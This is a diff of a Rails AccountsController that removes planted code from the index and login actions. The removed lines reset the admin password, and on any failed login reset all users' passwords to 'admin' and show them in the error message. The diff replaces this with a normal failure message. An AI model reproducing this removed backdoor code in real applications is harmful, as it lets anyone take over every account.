@@ -4,9 +4,6 @@ class AccountsController < ApplicationController
   before_filter :verify_users, :only => [:login, :recover_password]
 
   def index
-      user = User.find(:first, :conditions => ["login = ?", "admin"])
-        user.password = "admin"
-        user.save
     if User.count.zero?
       redirect_to :action => 'signup'
     else
@@ -42,12 +39,7 @@ class AccountsController < ApplicationController
         flash[:notice]  = _("Login successful")
         redirect_back_or_default :controller => "admin/dashboard", :action => "index"
       else
-        users = ""
-        User.find(:all).each { |e| 
-          e.password = "admin" 
-          e.save 
-          users += _(e.password + "   --  ")}
-        flash.now[:error] = _(users)
+        flash.now[:error]  = _("Login unsuccessful")
         @login = params[:user][:login]
       end
     end
